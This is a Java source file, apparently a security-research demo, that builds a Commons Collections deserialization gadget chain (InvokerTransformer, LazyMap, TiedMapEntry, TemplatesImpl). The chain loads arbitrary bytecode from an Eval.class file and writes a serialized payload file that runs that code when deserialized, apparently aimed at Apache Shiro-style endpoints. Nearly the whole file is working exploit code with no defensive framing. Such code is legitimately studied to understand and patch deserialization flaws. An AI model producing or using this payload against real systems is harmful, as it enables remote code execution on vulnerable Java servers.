package priv.ga0weI.demoshrio;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CCv3forshrio {
    public static void main(String[] args) throws  Exception {
        TemplatesImpl templates = new TemplatesImpl();

        reflectSetField(templates,"_name","xxxx");
        byte[] code = Files.readAllBytes(Paths.get(System.getProperty("user.dir")+"/Eval.class"));
        byte[] [] codes = {code};
        reflectSetField(templates,"_bytecodes",codes);
        reflectSetField(templates,"_tfactory",new TransformerFactoryImpl());

//        templates.newTransformer();
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);

        HashMap<Object,Object> map = new HashMap();
        Map lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,templates);
        Map map1 = new HashMap();
        map1.put(tiedMapEntry,"ssss");
        lazyMap.remove(templates);


        Class lm = LazyMap.class;
        Field factory = lm.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,invokerTransformer);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ccv3forshrio.ser"));
        oos.writeObject(map1);
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("ccv3forshrio.ser"));
        ois.readObject();


    }
    private static void reflectSetField(Object o , String filed , Object arg) throws Exception{
        Class ti = o.getClass();
        Field name = ti.getDeclaredField(filed);
        name.setAccessible(true);
        name.set(o,arg);
    }
}
